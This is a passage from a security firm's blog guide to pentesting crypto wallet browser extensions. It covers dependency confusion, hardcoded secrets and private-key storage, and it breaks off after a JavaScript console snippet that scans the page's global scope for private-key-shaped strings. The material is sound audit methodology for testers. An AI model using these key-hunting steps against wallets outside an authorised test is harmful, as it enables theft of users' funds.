<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>How to Hack a Web3 Wallet (Legally): A Full-Stack Pentesting Guide | VALKYRI</title>
<meta name=description content="A comprehensive security guide for pentesting crypto wallet browser extensions and conducting pentest engagement covering common vulnerabilities."><link rel=icon type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32.png><link rel=icon type=image/png sizes=64x64 href=/favicon-64.png><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Lexend+Peta:wght@400;500;600;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/valkyri-styles.min.e28e29fb16e9010a63e12278da8c15914d4d74adc1e9830bc8697ed97a6e41dd.css integrity="sha256-4o4p+xbpAQpj4SJ42owVkU1NdK3B6YMLyGl+2XpuQd0=" crossorigin=anonymous><link rel=stylesheet href=/css/main.min.585796db67f7e54fb348b7f042eb4f9c7e25563e581a1ecf22872c380e78b6b0.css integrity="sha256-WFeW22f35U+zSLfwQutPnH4lVj5YGh7PIocsOA54trA=" crossorigin=anonymous></head><body><header><style>header{padding-block:6px;position:fixed;top:0;left:0;right:0;width:100%;z-index:1000;margin:0;background:rgba(0,0,0,.9);backdrop-filter:blur(10px)}nav.container{display:flex;align-items:center;justify-content:space-between;padding:6px 20px;margin:0}.logo{display:flex;align-items:center;gap:8px;text-decoration:none;color:#fff;padding-left:15%}.logo img{width:48px;height:48px}.logo span{font-weight:700;font-size:1.2rem;color:#fff}.nav-center{display:flex}.nav-center .nav-links{display:flex;gap:1rem;align-items:center;margin:0;padding:0;list-style:none}nav>.nav-links{display:none;margin:0;padding:0;list-style:none}.nav-links a{display:inline-block;padding:6px 12px;font-size:.9rem;text-decoration:none;color:#fff;transition:color .3s ease}.nav-links a:hover{color:#9d3d8f}.hamburger{display:none;flex-direction:column;cursor:pointer;gap:4px;padding:8px;z-index:1001;background:0 0;border:none}.hamburger span{width:25px;height:3px;background:#fff;transition:all .3s ease;border-radius:2px}.cta-button{display:inline-block;padding:12px 24px;background:linear-gradient(90deg,#9d3d8f 0%,#8a2f79 100%);color:#fff;font-weight:600;border-radius:8px;box-shadow:0 6px 18px rgba(157,61,143,.18),0 0 0 6px rgba(157,61,143,4%);text-decoration:none;border:1px solid rgba(255,255,255,6%);transition:transform .12s ease,box-shadow .12s ease,filter .12s ease;font-size:.9rem}.cta-button:hover{transform:translateY(-2px);box-shadow:0 10px 24px rgba(157,61,143,.22),0 0 0 8px rgba(157,61,143,6%);filter:none;opacity:1}.cta-button:active{transform:translateY(0);box-shadow:0 6px 18px rgba(157,61,143,.18)}@media(max-width:768px){header{padding-block:4px}.logo img{width:44px;height:44px}.logo span{font-size:1.1rem}.nav-center{display:none}.hamburger{display:flex}nav>.nav-links{display:flex;position:fixed;top:0;left:-100%;width:100%;height:100vh;background:rgba(0,0,0,.95);backdrop-filter:blur(10px);flex-direction:column;justify-content:center;align-items:center;gap:2rem;transition:left .3s ease;z-index:1000}nav>.nav-links.active{left:0}.nav-links a{color:#fff;font-size:1.2rem;padding:1rem 2rem;border-radius:8px;transition:background .3s ease}.nav-links a:hover{background:rgba(157,61,143,.2)}.hamburger.active span:nth-child(1){transform:rotate(45deg)translate(5px,5px);background:#fff}.hamburger.active span:nth-child(2){opacity:0}.hamburger.active span:nth-child(3){transform:rotate(-45deg)translate(7px,-6px);background:#fff}.cta-button{padding:10px 18px;font-size:.85rem}}</style><nav class=container><a href=https://blog.valkyri.xyz/ class=logo><img src=/logo.png alt="Valkyri Security Logo" width=48 height=48 loading=eager>
<span>VALKYRI</span></a><div class=nav-center><ul class=nav-links><li><a href=https://valkyri.xyz/#services>Services</a></li><li><a href=#certifications>Certifications</a></li><li><a href=#process>Process</a></li><li><a href=https://blog.valkyri.xyz>Blog</a></li><li><a href=#contact class=cta-button>Request Quote</a></li></ul></div><ul class=nav-links><li><a href=https://valkyri.xyz/#services>Services</a></li><li><a href=#certifications>Certifications</a></li><li><a href=#process>Process</a></li><li><a href=https://blog.valkyri.xyz>Blog</a></li><li><a href=#contact class=cta-button>Request Quote</a></li></ul><div class=hamburger><span></span>
<span></span>
<span></span></div></nav></header><main class="max-w-7xl mx-auto px-4 md:px-6 lg:px-8"><div id=breadcrumb class="max-w-7xl mx-auto py-8"><ul class="flex space-x-4 text-sm text-zinc-500"><li class="after:content-['❯'] after:ml-4 after:opacity-30 last:after:content-none uppercase"><a href=https://blog.valkyri.xyz/>VALKYRI</a></li><li class="after:content-['❯'] after:ml-4 after:opacity-30 last:after:content-none uppercase"><a href=https://blog.valkyri.xyz/posts/>Posts</a></li></ul></div><div class="max-w-6xl mx-auto mb-4 px-8"><div id=top-of-site-pixel-anchor></div><div class="flex flex-col lg:flex-row gap-6 justify-between items-start"><main class="flex-1 max-w-3xl mx-auto"><article class="prose lg:prose-base mx-auto"><div class="post-header not-prose mb-3"><h1 id=title class="text-4xl font-bold leading-normal mb-2">How to Hack a Web3 Wallet (Legally): A Full-Stack Pentesting Guide</h1><div id=lead class=my-2><p>A comprehensive security guide for pentesting crypto wallet browser extensions and conducting pentest engagement covering common vulnerabilities.</p></div><div id=writer class="flex items-center space-x-4"><img class="w-12 h-12 bg-black rounded-full" src=https://blog.valkyri.xyz/0xaudron.png alt="0xaudron avatar" width=518 height=535><ul class="flex items-center space-x-4 flex-nowrap whitespace-nowrap overflow-x-auto"><li class="font-semibold my-1">0xaudron</li><li class="before:content-['•'] before:mr-2 before:opacity-50 my-1"><time datetime=2025-08-15T23:00:00+05:30>August 15, 2025</time></li><li class="before:content-['•'] before:mr-2 before:opacity-50 my-1">25 min read</li></ul></div></div><aside class="lg:block w-72 flex-shrink-0"><div class="sticky top-24"><div class="max-h-[calc(100vh-6rem)] overflow-y-auto bg-white rounded-xl shadow-sm p-6 border border-gray-100"><h2 class="text-base font-semibold mb-4 text-gray-900">Table of Contents</h2><nav class="text-sm space-y-3"><div class="[&>ul]:list-none [&>ul]:pl-0 
     [&>ul>ul]:pl-4 [&>ul>ul]:mt-2 [&>ul>ul]:border-l [&>ul>ul]:border-gray-200
         [&_li]:mb-2 [&_li]:leading-relaxed
[&_a]:block [&_a]:text-gray-700 [&_a]:no-underline [&_a]:transition-all
              [&_a:hover]:text-black [&_a:hover]:bg-gray-50 [&_a:hover]:pl-2 [&_a:hover]:rounded
[&_a.active]:text-black [&_a.active]:font-medium [&_a.active]:bg-gray-100 [&_a.active]:px-2 [&_a.active]:rounded"><nav id=TableOfContents><ul><li><a href=#introduction><strong>INTRODUCTION</strong></a></li><li><a href=#architecture><strong>ARCHITECTURE</strong></a></li><li><a href=#1-supply-chain-attack>1. <strong>Supply Chain Attack</strong></a><ul><li><a href=#11-dependency-confusion>1.1. Dependency Confusion</a></li><li><a href=#12-vulnerable-versions-of-dependencies>1.2. Vulnerable Versions of Dependencies</a></li></ul></li><li><a href=#2-hardcoded-secrets>2. <strong>Hardcoded secrets</strong></a></li><li><a href=#3-private-key-handling><strong>3. Private Key Handling</strong></a><ul><li><a href=#31-plain-text-storage-of-keys>3.1 Plain-text storage of keys</a></li><li><a href=#32-audit-the-encryption-method>3.2 Audit the encryption method</a></li><li><a href=#33-inspect-in-memory-handling>3.3 Inspect in-memory handling</a></li></ul></li><li><a href=#4-broken-access-control>4. <strong>Broken Access Control</strong></a><ul><li><a href=#41-idor-insecure-direct-object-reference>4.1 IDOR (Insecure Direct Object Reference)</a></li><li><a href=#42-unauthorized-message-or-transaction-signing-without-user-interaction>4.2 Unauthorized Message or Transaction Signing without user interaction</a></li><li><a href=#43--extension-apis-exposed-while-locked>4.3 Extension APIs Exposed While Locked</a></li><li><a href=#44-performing-sensitive-functions-without-user-confirmation>4.4 Performing sensitive functions without user confirmation</a></li></ul></li><li><a href=#5-cross-site-scripting>5. <strong>Cross Site Scripting</strong></a></li><li><a href=#6-clickjacking-attack>6. <strong>Clickjacking Attack</strong></a></li><li><a href=#7-denial-of-service-dos>7. <strong>Denial of Service (DoS)</strong></a><ul><li><a href=#71-lack-of-rate-limiting>7.1 Lack of rate-limiting</a></li><li><a href=#72-improper-input-parsing>7.2 Improper input parsing</a></li></ul></li><li><a href=#8-deceptive-uiux>8. <strong>Deceptive UI/UX</strong></a></li><li><a href=#9-clipboard-based-attacks>9. <strong>Clipboard Based Attacks</strong></a></li><li><a href=#10-domain-based-issues>10. <strong>Domain based issues</strong></a><ul><li><a href=#101-subdomain-takeover>10.1 Subdomain Takeover</a></li><li><a href=#102-dapp-spoofing-via-similar-urls>10.2 DApp Spoofing via Similar URLs</a></li><li><a href=#103-cross-origin-resource-sharing-misconfiguration>10.3 Cross Origin Resource Sharing Misconfiguration</a></li><li><a href=#104-ens-domain-name>10.4 ENS Domain Name</a></li><li><a href=#105-social-media-handles-takeover>10.5 Social Media handles takeover</a></li></ul></li><li><a href=#11-best-security-policies>11. <strong>Best security policies</strong></a><ul><li><a href=#111-autolock-function>11.1 Autolock function</a></li><li><a href=#112-password-policy>11.2 Password Policy</a></li></ul></li><li><a href=#12-manifest-file-misconfiguration>12. <strong>Manifest file Misconfiguration</strong></a></li></ul></nav></div></nav></div></div></aside><figure id=featureimage class="rounded-xl aspect-video mx-auto"><img class="w-full h-full object-cover" src=https://blog.valkyri.xyz/images/featured.png alt="How to Hack a Web3 Wallet (Legally): A Full-Stack Pentesting Guide featured image" width=817 height=580 loading=lazy></figure><div class="entry-content mx-auto"><h2 id=introduction><strong>INTRODUCTION</strong></h2><p>Crypto wallets are the critical bridge (or gateway) between Web2 and Web3 by which you interact with web3 based dApps. . But what if the very tool you rely on has hidden security flaws? That’s a serious risk. This guide is your essential companion for uncovering bugs in crypto wallet extensions. While not exhaustive, it highlights various common areas for assessment. <strong>For Wallet security review/audits/pentest,<a href=https://t.me/ValkyriSecurity>contact us!</a></strong></p><p>This guide is limited to the context of crypto wallets browser extension pentesting. Crypto wallets like Metamask alone has 15 million users using the extension. Browser crypto extension are regarded as go-to (or default) tool for most users. Let’s dive into the common security issues in context of pentesting the crypto wallets.</p><h2 id=architecture><strong>ARCHITECTURE</strong></h2><p>A crypto wallet browser extension is a type of app that runs within a web browser and interacts with blockchain networks. Its architecture typically combines frontend (UI), backend logic, cryptographic key management, and secure communication between the extension, the blockchain, and web pages (DApps).</p><ul><li><strong>Background Scripts</strong> : This is the back-end of the crypto wallets. It runs in the background as a service worker. It handles account state, stores encrypted private keys, and acts as a controller for all transaction flows. The private key is encrypted using the WebCrypto API and a password-derived key, stored securely in <code>chrome.storage.local</code> or <code>IndexedDB</code>. When the user unlocks the wallet, the decrypted key remains in memory only for the duration of the session.</li><li><strong>Content Scripts :</strong> It injects a provider object into the webpage (<code>window.ethereum</code> or similar). This provider complies with standards like EIP-1193 and allows the DApp to request accounts, send transactions, or sign messages. These requests are routed through a secure message bridge to the background script, which processes them and sends a response back to the DApp.</li><li><strong>UI :</strong> It is usually built with React or a similar framework which allows users to view balances, sign transactions, manage networks, and interact with DApps. It communicates with the background script through message passing using the browser extension APIs. When a transaction request is received, the UI presents a confirmation window, and upon approval, the background script signs and broadcasts the transaction using the connected blockchain node (typically via JSON-RPC).</li><li><strong>manifest.json :</strong> This file specifies configuration of crypto wallets like <code>permissions</code>, <code>CSP</code>, <code>icons</code>, <code>host_permissions</code>, <code>web_accessible_resources</code>, <code>content_scripts</code>, etc.</li><li><strong>package.json :</strong> This file specifies which dependencies are being used in this wallet extension.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>wallet</span><span style=color:#f92672>-</span><span style=color:#a6e22e>extension</span><span style=color:#f92672>/</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>│</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>manifest</span><span style=color:#f92672>.</span><span style=color:#a6e22e>json</span>                  <span style=color:#75715e># Browser extension manifest (v2,v3)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>package</span><span style=color:#f92672>.</span><span style=color:#a6e22e>json</span>                   <span style=color:#75715e># Project config and dependencies
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>tsconfig</span><span style=color:#f92672>.</span><span style=color:#a6e22e>json</span>                  <span style=color:#75715e># TypeScript configuration
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>webpack</span><span style=color:#f92672>.</span><span style=color:#a6e22e>config</span><span style=color:#f92672>.</span><span style=color:#a6e22e>js</span>              <span style=color:#75715e># Webpack build config (or Vite/Rollup)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>├──</span> <span style=color:#66d9ef>public</span><span style=color:#f92672>/</span>                        <span style=color:#75715e># Static assets
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>└──</span> <span style=color:#a6e22e>icons</span><span style=color:#f92672>/</span>                     <span style=color:#75715e># Extension icons for various sizes
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>       <span style=color:#a6e22e>└──</span> <span style=color:#a6e22e>icon_128</span><span style=color:#f92672>.</span><span style=color:#a6e22e>png</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>│</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>/</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>background</span><span style=color:#f92672>/</span>                <span style=color:#75715e># Background script logic
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>index</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ts</span>               <span style=color:#75715e># Entry point for background service worker
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>walletController</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ts</span>    <span style=color:#75715e># Manages accounts, transactions, state
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>keyManager</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ts</span>          <span style=color:#75715e># Key vault and encryption/decryption
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>└──</span> <span style=color:#a6e22e>rpcHandler</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ts</span>          <span style=color:#75715e># JSON-RPC request handling
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>/</span>                   <span style=color:#75715e># Content script (injected into web pages)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>└──</span> <span style=color:#a6e22e>injectProvider</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ts</span>      <span style=color:#75715e># Injects provider object (e.g., window.ethereum)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>ui</span><span style=color:#f92672>/</span>                        <span style=color:#75715e># Popup UI (React/Svelte app)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>App</span><span style=color:#f92672>.</span><span style=color:#a6e22e>tsx</span>                <span style=color:#75715e># Main React app
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>components</span><span style=color:#f92672>/</span>            <span style=color:#75715e># UI components (buttons, modals, etc.)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>pages</span><span style=color:#f92672>/</span>                 <span style=color:#75715e># Screens like Home, Send, Settings
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>└──</span> <span style=color:#a6e22e>styles</span><span style=color:#f92672>/</span>                <span style=color:#75715e># CSS or Tailwind config
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>provider</span><span style=color:#f92672>/</span>                  <span style=color:#75715e># Injected provider implementation
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>└──</span> <span style=color:#a6e22e>ethereumProvider</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ts</span>    <span style=color:#75715e># Handles EIP-1193-compliant provider API
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>utils</span><span style=color:#f92672>/</span>                     <span style=color:#75715e># Utility modules (shared code)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>cryptoUtils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ts</span>         <span style=color:#75715e># Key generation, signing, encryption
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>└──</span> <span style=color:#a6e22e>storage</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ts</span>             <span style=color:#75715e># Wrapper around chrome.storage
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>messages</span><span style=color:#f92672>/</span>                  <span style=color:#75715e># Message handling between extension parts
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>├──</span> <span style=color:#a6e22e>types</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ts</span>               <span style=color:#75715e># Message types/interfaces
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>└──</span> <span style=color:#a6e22e>bridge</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ts</span>              <span style=color:#75715e># Messaging between content ⇄ background ⇄ UI
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>│</span>   <span style=color:#a6e22e>└──</span> <span style=color:#a6e22e>constants</span><span style=color:#f92672>/</span>                 <span style=color:#75715e># Chain info, token metadata, error codes
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>│</span>       <span style=color:#a6e22e>└──</span> <span style=color:#a6e22e>networks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ts</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>│</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>└──</span> <span style=color:#a6e22e>dist</span><span style=color:#f92672>/</span>                          <span style=color:#75715e># Build output for the extension (auto-generated)
</span></span></span></code></pre></div><p>The structuring is based in the following orders, obviously naming could differ for files but the core convention is mostly same. All communications between these components are tightly scoped to avoid exposing private data to malicious scripts. The extension maintains a strict permission system, ensuring that DApps must request access explicitly, and all sensitive actions (like sending funds or signing data) require direct user approval in the UI. There are certain common security issues which we will discuss and learn, they will come handy when you&rsquo;re pentesting crypto wallets:</p><h2 id=1-supply-chain-attack>1. <strong>Supply Chain Attack</strong></h2><p>This is mostly in regards with <code>package.json</code> , and are
a high-risk vector due to the heavy reliance on third-party packages. Since these extensions often manage sensitive operations like key generation, transaction signing, and network communication, a compromised or malicious dependency can directly impact the wallet’s integrity and user funds.</p><h3 id=11-dependency-confusion>1.1. Dependency Confusion</h3><p>Dependency confusion occurs when internal (private) packages referenced in <code>package.json</code> are unintentionally overridden by malicious public packages with the same name published to npm. This is particularly dangerous in wallet projects where internal libraries (e.g., <code>@company/crypto-utils</code>) are used for key handling, signing algorithms, or encryption.</p><p><strong>Attack Vector:</strong></p><ul><li>An attacker identifies internal packages in <code>package.json</code>, e.g., <code>@xyzabc/crypto-core</code>.</li><li>They publish a public package with the same name to npm.</li><li>If the wallet project doesn’t enforce scoped or private registry resolution (e.g., via <code>.npmrc</code>), npm installs the attacker&rsquo;s version i.e., the one published publically.</li><li>Malicious code runs during the build phase or at runtime (via postinstall scripts, runtime hooks), potentially exfiltrating private keys, mnemonics, or RPC traffic.</li></ul><p><strong>Fix :</strong> Implement proper resolution via <code>.npmrc</code> and reference the internal packages in <code>package.json</code> correctly.</p><h3 id=12-vulnerable-versions-of-dependencies>1.2. Vulnerable Versions of Dependencies</h3><p>Wallet extensions often depend on libraries such as <code>elliptic</code>, <code>noble-secp256k1</code>, <code>bip39</code>, <code>hdkey</code>, <code>pbkdf2</code>, <code>scrypt-js</code> etc. If any of these dependencies contain known CVEs (e.g., unsafe random number generation, timing side-channels, insecure deserialization), they can directly compromise wallet operations. So in the <code>package.json</code> the versioning convention is important :</p><ul><li><code>5.7.2</code> : Downloads exact version. Resolves to <code>5.7.2</code></li><li><code>~5.7.2</code> : Allows only patch-level updates. Resolves to <code>>=5.7.2 &lt;5.8.0</code></li><li><code>^1.2.2</code> : Allows updates that do not change the leftmost non-zero digit. Resolves to <code>>=5.7.2 &lt;6.0.0</code></li><li><code>>=5.7.0 &lt;5.9.0</code> : Allows specific version range. Used when you want tight control or restrict to tested versions.</li><li><code>*</code> : Matches <strong>any version</strong>. Highly discouraged in security-sensitive applications like wallets.</li></ul><p>There are instance where attackers go more deep into the dependencies and check up their associated dependency or look after security issues in them.</p><p><strong>Testing methodology</strong> : Simply run <code>npm audit</code> and it will list known CVEs associated with the dependency.</p><p><img src=/images/vuln-dependency.png alt="NPM Audit"></p><p><strong>Fix :</strong> Update and integrate your wallet with the proper versions which aren’t vulnerable to any security issues.</p><h2 id=2-hardcoded-secrets>2. <strong>Hardcoded secrets</strong></h2><p>Search or scan for hardcoded API keys, secrets, passkeys, generators etc. Often time while pushing the code devs forget to save it securely in <code>.env</code> files which causes leakage of keys and secrest like AWS, SLACK, JWT secrets</p><p>Common locations where sensitive secrets may be hardcoded:</p><ul><li><code>src/utils/cryptoUtils.ts</code> or <code>keyManager.ts</code> – key derivation, signing</li><li>Test or demo accounts in <code>config/devnet.ts</code>, <code>constants/testAccounts.ts</code></li><li>API auth secrets in <code>api.ts</code>, <code>network.ts</code></li><li>Mnemonics embedded in <code>walletController.ts</code> or test flows</li><li>Inline secrets in frontend UIs (e.g., <code>App.tsx</code>)</li><li>Legacy backup scripts or <code>.bak</code>, <code>.old</code> files left in repo</li></ul><p><strong>Example:</strong></p><p><img src=/images/hs.png alt="Example of hardcoded secrets"></p><p>NOTE: This filenames are just for example, they could differ depending on the context and environment you are pentesting.</p><p><strong>Testing Methodology</strong> : There are multiple tools which scans for high-entropy based string provided below with this which could do the job pretty efficienctly. You can also create custom semgrep rules if the tools don’t cover any specific patterns or regexes.</p><p><strong>Tools</strong>: <a href=https://github.com/gitleaks/gitleaks>gitleaks</a> , <a href=https://github.com/trufflesecurity/trufflehog>truffleHog</a>, <a href=https://github.com/awslabs/git-secrets>git-secrets</a></p><p><strong>Fix</strong>: Never hardcode them in the files, as they pose severe security risks. The standard way is to use store them in environment varaibles and fetch it from<code>.env</code></p><h2 id=3-private-key-handling><strong>3. Private Key Handling</strong></h2><p>This is the most hottest section when it comes to pentesting wallets, so utmost attention should be given. As the private key is the “main door key” to any “wallet”, used to sign transactions, messages, and authenticate users across blockchains. Once the private key is compromised, your funds are compromised.</p><p>This is the basic lifecycle of private key in extensions :</p><p><strong>Generation :</strong> Using <code>bip39</code>, <code>bip32</code>, or <code>noble-secp256k1</code> to derive keys from a mnemonic or generate random ECDSA keys.</p><p><strong>Encryption (Vaulting):</strong> Keys are encrypted using password-based key derivation (e.g. PBKDF2, scrypt, argon2) and stored securely.</p><p><strong>Storage:</strong> Encrypted blob is stored in <code>chrome.storage.local</code> , <code>IndexedDB</code>, or in-memory only (in hardened implementations).</p><p><strong>Decryption & Usage:</strong> Key is decrypted on unlock and used to sign transactions or messages using EIP-712, EIP-191, etc.</p><p><strong>Memory Handling & Cleanup:</strong> Key may remain in memory (global or module scope) until user locks the wallet or the session ends.</p><h3 id=31-plain-text-storage-of-keys>3.1 Plain-text storage of keys</h3><p>Developer make mistakes by storing plaintext private keys in the for testing in <code>chrome.storage.local</code> , <code>browser.storage.local</code> or <code>localStorage</code> <strong>,</strong> <code>sessionStorage</code> which may help in opening the door for attackers to your wallet and funds definitely. Since these storage types are persistent and accessible to Javascript making it high-value attack vector.</p><p><strong>Testing Methodology :</strong></p><ol><li>Open DevTools → Application tab → Storage</li><li>Inspect: <code>chrome.storage.local</code> , <code>browser.storage.local</code> , <code>localStorage</code> , <code>IndexedDB</code>, <code>sessionStorage</code></li><li>Look for fields like : <code>privateKey</code>, <code>wallet</code>, <code>vault</code>, <code>mnemonic</code>, <code>seed</code>, <code>keystore</code> etc. where you can find the plain text storage of private key or mnemonic.</li></ol><p><strong>Fix :</strong> Keeping private keys in memory only, and never saving them to persistent storage, eliminates the attack surface entirely. Even in memory clear it once work is done.</p><h3 id=32-audit-the-encryption-method>3.2 Audit the encryption method</h3><p>If the encryption being used is <code>pbkdf2</code>, <code>scrypt</code> etc. then review its iteration count, salt randomness, and IV generation. Refer to this <a href=https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption>article</a> for more insight on testing methodology.</p><p><strong>Attack Vector</strong> : If the PBKDF has low iteration count (e.g., 1,000 rounds in PBKDF2), offline brute-force attacks become trivial if the encrypted blob is leaked.</p><p><img src=/images/atem.png alt="Weak pbkdf2 seeds"></p><p><strong>Fix</strong>: Configure the cryptographic configurations as specified in OWASP and NIST standards</p><h3 id=33-inspect-in-memory-handling>3.3 Inspect in-memory handling</h3><p>Even if private keys are encrypted at rest, they must be <strong>decrypted and held in memory</strong> during active usage (e.g., for signing transactions). Improper memory management can lead to sensitive key material lingering in global scopes or being exposed through dev tools, memory dumps, heap dump or JS object inspection.</p><p><strong>Testing Methodology (for global scope vars, heap, memory):</strong></p><ol><li><p>Trigger actions which involve performing something with the key like signing a transaction, message etc. to ensure private key is loaded</p></li><li><p>Dump Global Scope : DevTools → Console: <code>Object.keys(window)</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#75715e>// Pattern to scan 64 chars, which is typically the private key
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>key</span> <span style=color:#66d9ef>in</span> window) {
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>val</span> <span style=color:#f92672>=</span> window[<span style=color:#a6e22e>key</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>typeof</span> <span style=color:#a6e22e>val</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;string&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#e6db74>/^0x[a-f0-9]{64}$/i</span>.<span style=color:#a6e22e>test</span>(<span style=color:#a6e22e>val</span>)) {
</span></span><span style=display:flex><span>     <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;🕵️ Leaked key:&#34;</span>, <span style=color:#a6e22e>key</span>, <span style=color:#a6e22e>val</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>_</span>) {}
</span></span><span style=display:flex><span>}
